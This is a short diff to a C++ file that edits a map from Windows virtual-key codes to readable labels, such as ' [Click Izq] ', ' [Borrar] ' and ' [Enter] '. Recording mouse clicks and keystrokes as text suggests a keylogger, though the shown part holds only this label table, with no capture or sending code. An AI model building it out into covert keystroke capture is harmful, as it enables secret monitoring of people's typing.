@@ -8,15 +8,15 @@ using namespace std;
 int main(int argc, char *argv[]){
 	
 	map<int, string> ch;
-    ch[1] = " [mouse click] ";
-    ch[2] = " [mouse menu context] ";
-    ch[8] = " [Backspace] ";
+    ch[1] = " [Click Izq] ";
+    ch[2] = " [Click Der] ";
+    ch[8] = " [Borrar] ";
     ch[9] = " [Tab] ";
-    ch[13] = " [Intro] ";
+    ch[13] = " [Enter] ";
     ch[16] = " [Shift] ";
     ch[17] = " [Control] ";
     ch[18] = " [Alt] ";
-    ch[20] = " [Bloq Mayús] ";
+    ch[20] = " [Bloq Mayus] ";
     ch[27] = " [Esc] ";
     ch[32] = " ";
     ch[37] = " [Flecha izquierda] ";
@@ -62,7 +62,7 @@ int main(int argc, char *argv[]){
     ch[88] = "x";
     ch[89] = "y";
     ch[90] = "z";
-    ch[91] = " [Menu Windows] ";
+    ch[91] = " [Windows] ";
     ch[96] = "0";
     ch[97] = "1";
     ch[98] = "2";
